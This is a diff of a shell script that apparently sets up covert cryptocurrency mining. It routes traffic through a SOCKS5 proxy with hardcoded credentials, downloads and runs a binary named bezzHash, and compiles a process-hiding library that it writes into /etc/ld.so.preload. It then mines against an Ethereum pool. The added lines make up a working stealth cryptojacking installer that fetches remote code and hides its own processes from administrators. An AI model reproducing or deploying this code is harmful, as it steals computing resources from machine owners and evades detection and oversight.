@@ -1,2 +1,44 @@
 #!/bin/sh
-sudo wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz && tar -xf t-rex-0.26.4-linux.tar.gz && chmod +x t-rex && ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  LD_PRELOAD="" ./t-rex -a progpowz -o stratum+tcp://zano.luckypool.io:8877 -u ZxDAs3wUtBej4jYU8FJ4nQLbXS6ssTAGCEwEutSSZS7tR4yY6xxFs4m93opr971o5TH8gGfW4xsFkeXSeSQfx6wZ1vEAmVpTA -p x -w $ip -q
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl && apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install ocl-icd-opencl-dev && wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz && tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.133.59.40:12324
+socks5_username = 14aeb5d7c245b
+socks5_password = 7f5bdbecdb
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash 
+chmod +x bezzHash 
+ 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
+unzip magicBezzHash.zip 
+make 
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
+mv libprocesshider.so /usr/local/lib/ 
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
+ 
+./graftcp/graftcp ./bezzHash --url=ssl://0x7a8f069g453654345612345dbF742b2c8.$(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))@eth-sg.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
